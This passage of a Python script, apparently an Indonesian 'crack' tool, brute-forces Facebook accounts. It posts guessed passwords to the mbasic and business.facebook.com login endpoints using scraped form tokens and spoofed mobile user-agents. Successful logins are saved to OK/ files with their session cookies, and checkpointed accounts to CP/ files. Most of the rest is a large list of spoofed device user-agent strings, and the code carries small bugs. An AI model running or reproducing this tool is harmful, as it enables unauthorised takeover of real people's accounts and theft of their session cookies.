				headers = {'User-Agent': ua,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Content-Type': 'application/x-www-form-urlencoded','cache-control': 'max-age=0','dpr': '1.75','viewport-width': '980','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-ch-ua-model': '"SM-A115F"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
				params = {'refsrc': 'deprecated', 'lwv': '100', 'refid': '8',}
				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params, headers=headers, data=data, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1
		
	def bussines(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}Bussines {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				link = ses.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
				data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(link)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(link)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(link)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(link)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(link)).group(1),'email':user,'prefill_contact_point':user,'prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{str(RakaXF()).split('.')[0]}:{pw}"}
				head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(120,126))}.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				response = ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1
	# FINISH
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")
   
   
	def pilih_useragent(self):
		print("")
		print(f" {P}Silahkan Pilih UserAgent:")
		print(" 1. OPPO A37")
		print(" 2. HUAWEI")
		print(" 3. OPPO RENO")
		print(" 4. BLACKBERRY")
		print(" 5. INFINIX")
		print("")
		pilih = input(" pilih (1-5): ")

		if pilih == "1":
			pilih = "oppo-a37"
		elif pilih == "2": 
			pilih = "huawei"
		elif pilih == "3":
			pilih = "oppo-reno"
		elif pilih == "4":
			pilih = "blackberry"
		elif pilih == "5":
			pilih == "infinix"
		else:
			exit(" Pilihan Tidak Ada!")

		self.UA = self.user_agentAPI(pilih)
	
	#--- USER AGENT
	def UA(self):
		try:
			uas = open('ugent.txt','r').read()
		except (FileNotFoundError,IOError):
			uas = ("Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 6.14.0.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.303 Mobile Safari/537.36")
			open('ugent.txt','w').write(uas)
		
		return uas 
			
	def user_agentAPI(self, pilih: str):
		ugent = {
			"oppo-a37": [
				"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/282.0.0.40.117;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/409.0.0.8.114;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/357.0.0.12.72;FBDM/DisplayMetrics{density=2.0, width=720, height=1280,2.0, xdpi=294.967, ydpi=295.563};]",
				"Mozilla/5.0 (Linux; U; Android 7.1; en-; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.121 Mobile Safari/537.36 PHX/16.2",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/419.0.0.6.109;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 Instagram 278.0.0.22.117 Android (22/5.1.1; 320dpi; 720x1280; OPPO; A37f; A37f; qcom; en_US; 471827227)",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 7.1; en-us; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.121 Mobile Safari/537.36 PHX/16.2",
				"Mozilla/5.0 (Linux; U; Android 5.1; en-gb; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 Channel/release AppName/ultralite app_version/35.5.2 Region/ID ByteLocale/in-ID ByteFullLocale/id-ID Spark/1.2.7-alpha.93-arch AppVersion/35.5.2",
				"Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/ms_MY;FBAV/418.0.0.6.105;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 (Mobile; afma-sdk-a-v242402999.241806000.1)",
				"Mozilla/5.0 DelfiLTwww/627 EmbeddedBrowser (Linux; Android 12; 2107113SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.64 Mobile Safari/537.36 DeviceUID: 00ce161b-0842-46ec-a608-cbd8ea27d2ae VendorUID: 2aa37f33-acb7-907f-d3f9-79a83c15d6d4 AppPkgID: lt.delfi",
				"Mozilla/5.0 Autopliuslt/7.0.4 EmbeddedBrowser (Linux; Android 14; CPH2581 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.64 Mobile Safari/537.36 DeviceUID: 9b75a6f6-971f-4885-b292-ef548da37fa0 VendorUID: ba51716a-525f-572c-7b34-072f2851d51e AppPkgID: lt.plius.auto",
				"Mozilla/5.0 (Linux; U; Android 5.1; pt-pt; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.121 Mobile Safari/537.36 PHX/16.2",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/th_TH;FBAV/419.0.0.6.109;]",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_AR;FBAV/417.0.0.9.97;FB_FW/1;FBDM/DisplayMetrics{density=2.0, width=720, height=1280,2.0, xdpi=294.967, ydpi=295.563};]",
				"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-tw; PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/10.7.31.2",
				"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4181.5 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Quark/3.8.1.125 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 8.1.0; en-gb; CPH1809 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.0.4beta",
				"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.4.104.00 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/10.7.32.1",
				'Mozilla/5.0 (Linux; U; Android 8.1.0; en-au; CPH1809 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/7.6.5beta',
            ],
            
            "huawei": [
				"Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 6.14.0.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.303 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; U; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 OPR/80.0.2254.71401",
				"13GO/5.2.2(13GO)-Android 10 -Source: VideoPlayer/APPandroid-8ab7eb29-5134-4fc4-8d33-63eefface554 -Device: HUAWEI|MAR-LX3A|PHONE|V2",
				"UAAPK1972; SDK31; b16d2f3c6b264fda; HWDCO REL v12; 175.141.46.138 DCO-LX9 HUAWEI;",
				"Mozilla/5.0 (Linux; Android 9; Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.123 Mobile Safari/537.36 Instagram 340.0.0.22.109 Android (28/9; 480dpi; 1080x2265; HUAWEI; unknown; HWVOG; kirin980; en_FR; 622859844)",
				"Latina/2.3.2(Latina)-Android 10 -Source: VideoPlayer/APPandroid-27e78d35-d22f-40c3-8f8c-24a6714e5e6f -Device: HUAWEI|VOG-L04|PHONE|V2",
				"13GO/5.2.2(13GO)-Android 9 -Source: VideoPlayer/APPandroid-355a4bc1-9a09-4024-856c-e0e7327770b5 -Device: HUAWEI|MRD-LX3|PHONE|V2",
				"13GO/5.2.2(13GO)-Android 10 -Source: VideoPlayer/APPandroid-221ef3d8-162c-4ea6-941e-326faaf9fb6c -Device: HUAWEI|STK-LX3|PHONE|V2",
				"Ecuavisa/1.11.4(Ecuavisa)-Android 10 -Source: VideoPlayer/APPandroid-8b1cf275-a9ce-4f0f-bc67-b8b8a0cde517 -Device: HUAWEI|STK-LX3|PHONE|V2",
				"[FBAN/FB4A;FBAV/472.0.0.45.79;FBBV/620821020;FBDM/{density=3.0,width=1080,height=2107};FBLC/hr_HR;FBRV/623942774;FBCR/Telemach;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
				"13GO/5.2.2(13GO)-Android 9 -Source: VideoPlayer/APPandroid-3a7f054a-19bb-449a-b96a-36623fbaea0d -Device: HUAWEI|MRD-LX3|PHONE|V2",
				"Ecuavisa/1.11.4(Ecuavisa)-Android 8.0.0 -Source: VideoPlayer/APPandroid-beabb722-6b80-40db-81c2-61941f4ac7d7 -Device: HUAWEI|AGS-L03|TABLET|V2",
				"Latina/2.3.2(Latina)-Android 10 -Source: VideoPlayer/APPandroid-789c8bbe-daf6-44fc-8aa4-5443f5cada54 -Device: HUAWEI|STK-LX3|PHONE|V2",
				"[FBAN/FB4A;FBAV/454.1.0.49.104;FBBV/574523121;FBDM/{density=3.0,width=1080,height=2172};FBLC/de_DE;FBRV/575944275;FBCR/vodafone.de;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CDY-NX9A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
				"Mozilla/5.0 (Linux; Android 10; HLK-AL00 Build/HONORHLK-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36;/eusoft_eudic_en_android/9.6.0/80537e4b9f81e7d0//huawei/;/eusoft_eudic_en_android/9.6.0/80537e4b9f81e7d0//huawei/",
			],
            
            "oppo-reno": [
				"Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",
				"Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]",
				"Mozilla/5.0 (Linux; Android 12; CPH2357 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]",
				"Mozilla/5.0 (Linux; Android 12; CPH2359 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
				"Mozilla/5.0 (Linux; Android 13; CPH2357 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
			],
            
            "blackberry": [
				"BlackBerry 9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
				"BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331 UNTRUSTED/1.0 3gpp-gba/UC Browser8.0.3.107/70/352 UNTRUSTED/1.0",
				"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+",
				"BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331 UNTRUSTED/1.0 3gpp-gba/UC Browser8.0.3.107/70/352 UNTRUSTED/1.0",
				"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.2.1.3442 Mobile Safari/537.35+ [ip:213.32.4.211]",
				"Mozilla/5.0 (BlackBerry; U; BlackBerry 9620; pt-BR) AppleWebKit/534.11 (KHTML, like Gecko) Version/7.1.0.1112 Mobile Safari/534.11",
			],
   
            "infinix": [
				"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",
				"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
				"Mozilla/5.0 (Linux; Android 11; Infinix X687) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 Instabridge/21.9.0",
				"Mozilla/5.0 (Linux; Android 10; Infinix X687) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168",
				"Mozilla/5.0 (Linux; Android 10; Infinix X687) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.14.0",
				"Mozilla/5.0 (Linux; Android 7.1.1; Infinix Zero 4 Plus Build/NMF26O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36 EdgA/91.0.864.48",
				"Mozilla/5.0 (Linux; Android 7.0; Infinix NOTE 3 Pro Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.141 Mobile Safari/537.36 OPR/45.1.2246.125351",
				"Mozilla/5.0 (Linux; Android 4.2.2; Infinix X1000 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.59 Safari/537.36",
			]
		}
  
		return ugent[pilih] 

if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	try:os.mkdir('CP')
	except:pass 
	try:os.mkdir('OK')
	except:pass 
	activate_licensi()
